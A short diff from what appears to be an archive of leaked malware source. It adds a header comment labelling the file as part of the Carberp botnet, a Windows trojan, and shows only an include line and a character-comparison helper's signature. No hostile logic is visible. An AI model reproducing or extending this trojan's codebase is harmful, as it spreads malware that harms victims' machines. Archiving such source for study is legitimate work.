@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 #include "std.h"
 
 bool ChrCmpI(WCHAR cChr1,WCHAR cChr2,byte *bNewStrFlag)
